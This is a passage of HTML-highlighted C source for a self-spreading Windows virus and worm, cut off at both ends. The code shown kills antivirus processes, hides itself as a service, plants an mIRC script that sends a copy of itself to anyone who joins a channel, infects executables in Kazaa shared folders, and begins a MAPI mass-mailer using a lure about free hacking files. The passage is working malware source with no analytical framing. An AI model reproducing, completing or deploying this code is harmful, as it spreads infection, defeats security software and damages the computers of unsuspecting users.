           </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"viru"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"safe"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">hproc</span><span class="sc10">=</span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc19">proc</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">,</span><span class="sc4">666</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hproc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc19">proc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">InitVirus</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">cmd</span><span class="sc10">,</span><span class="sc11">kernel_path</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">krnl</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc11">RSP</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">cmd</span><span class="sc10">=</span><span class="sc11">GetCommandLine</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">cmd</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">VirusPath</span><span class="sc10">[</span><span class="sc11">pos</span><span class="sc10">]=(*</span><span class="sc11">cmd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pos</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">cmd</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">((*</span><span class="sc11">cmd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'"'</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">cmd</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((*</span><span class="sc11">cmd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">cmd</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc11">pos</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">((*</span><span class="sc11">cmd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">VirusParameters</span><span class="sc10">[</span><span class="sc11">pos</span><span class="sc10">]=(*</span><span class="sc11">cmd</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cmd</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc11">pos</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">GetTempPath</span><span class="sc10">(</span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc11">VirusTempFile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">VirusTempFile</span><span class="sc10">,</span><span class="sc6">"Mescaline.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">kernel_path</span><span class="sc10">,</span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">kernel_path</span><span class="sc10">,</span><span class="sc6">"\\Kernel32.dll"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">krnl</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc11">kernel_path</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">krnl</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">RSP</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">krnl</span><span class="sc10">,</span><span class="sc6">"RegisterServiceProcess"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">RSP</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">__asm</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">01h</span><span class="sc0">
                    </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">
                    </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">RSP</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">krnl</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">AntiAV</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">IRC</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mirc</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">File</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hfile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mirc</span><span class="sc10">,</span><span class="sc6">"C:\\Program Files\\mIRC\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc11">mirc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc6">"mirc.ini"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetFileAttributes</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">)!=-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"rfiles"</span><span class="sc10">,</span><span class="sc6">"n2"</span><span class="sc10">,</span><span class="sc6">"mirc.dll"</span><span class="sc10">,</span><span class="sc11">File</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc11">mirc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc6">"hi.scr"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">VirusPath</span><span class="sc10">,</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc11">mirc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc6">"mirc.dll"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc6">"w"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc6">"on 1:join:#: { if ( $nick == $me ) halt\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc6">"else /dcc send $nick %shi.scr }"</span><span class="sc10">,</span><span class="sc11">mirc</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsInfectable</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">last</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">last</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">last</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">last</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]=</span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">strlwr</span><span class="sc10">(</span><span class="sc11">last</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">last</span><span class="sc10">,</span><span class="sc6">"exe"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">last</span><span class="sc10">,</span><span class="sc6">"scr"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Sucker2Sucker</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hkey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">RetValue</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">num</span><span class="sc10">;;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">share</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">Sshare</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">share</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">search</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">path</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">full</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">text</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hfile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">hfind</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RetValue</span><span class="sc10">=</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Software\\Kazaa\\LocalContent"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RetValue</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">search</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">num</span><span class="sc10">=</span><span class="sc4">48</span><span class="sc10">;</span><span class="sc11">num</span><span class="sc10">!=</span><span class="sc4">58</span><span class="sc10">;</span><span class="sc11">num</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">text</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc7">'d'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">text</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc7">'i'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">text</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]=</span><span class="sc7">'r'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">text</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]=</span><span class="sc11">num</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">!=</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">search</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">text</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">!=</span><span class="sc11">MAX_PATH</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">search</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">RetValue</span><span class="sc10">=</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc11">search</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">share</span><span class="sc10">,&amp;</span><span class="sc11">Sshare</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RetValue</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">MAX_PATH</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc11">path</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">7</span><span class="sc10">]=</span><span class="sc11">share</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">search</span><span class="sc10">,</span><span class="sc11">path</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc6">"\\*.*"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,&amp;</span><span class="sc11">hfind</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">do</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">full</span><span class="sc10">,</span><span class="sc11">search</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">full</span><span class="sc10">,</span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">strncat</span><span class="sc10">(</span><span class="sc11">full</span><span class="sc10">,</span><span class="sc11">hfind</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">hfind</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">IsInfectable</span><span class="sc10">(</span><span class="sc11">full</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">full</span><span class="sc10">)&gt;</span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">Infect_file</span><span class="sc10">(</span><span class="sc11">VirusPath</span><span class="sc10">,</span><span class="sc11">full</span><span class="sc10">,</span><span class="sc6">"Ml"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,&amp;</span><span class="sc11">hfind</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*-----------------------[Mapi Worm]----------------------*/</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">worming</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mapidll</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">mail_msg</span><span class="sc10">=</span><span class="sc6">"Secret Password,Data,Information Can Be Found Here !!!\nIn This e-mail you can find a lot of secret info\nlike password to web servers and documentation about hacking\nlike 'how to hack web server.txt',or 'How To crack ZIP archive.doc'\n(all documents are in the HackInfo.exe compressed package)\nif you like such stuff you can free register in our web site:\nwww.BestHackersOfTheWorld.com and you will get every week a new\npackage,like the one in the attachment,for free !!!\n\nif you don't want to get mail like this any more please send\n\ta blank e-mail to : BestHackers@dREF.com\n\nand if you want to support us send this mail without any\nchanging to other people that you know.\n\tThank You For Reading This Mail."</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">mapidll</span><span class="sc10">,</span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">mapidll</span><span class="sc10">,</span><span class="sc6">"\\mapi32.dll"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">MapiModule</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">MapiModule</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc11">mapidll</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">__asm</span><span class="sc0">
        </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc10">,</span><span class="sc4">01h</span><span class="sc0">     </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Fix</span><span class="sc0"> </span><span class="sc11">An</span><span class="sc0"> </span><span class="sc11">Expection</span><span class="sc0"> </span><span class="sc11">With</span><span class="sc0"> </span><span class="sc11">The</span><span class="sc0"> </span><span class="sc11">Msoe</span><span class="sc10">.</span><span class="sc11">dll</span><span class="sc0"> </span><span class="sc11">library</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">,</span><span class="sc11">LogOn</span><span class="sc10">,</span><span class="sc11">LogOff</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc11">mfile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">rec</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SendMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">,</span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">LogOn</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">,</span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">LogOff</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">,</span><span class="sc6">"MAPILogoff"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">MapiSession</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">LogOn</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LogOff</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SendMail</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MapiModule</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">retvalue</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc1">/* MapiLogOn */</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">lea</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc10">,</span><span class="sc11">MapiSession</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">lplhSession</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">ulReserved</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">flFlags</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">lpszPassword</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">lpszProfileName</span><span class="sc0">
        </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc4">00h</span><span class="sc0">    </span><span class="sc10">;</span><span class="sc11">ulUIParam</span><span class="sc0">
        </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">LogOn</span><span class="sc0">
        </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">retvalue</span><span class="sc10">,</span><span class="sc11">eax</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">retvalue</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
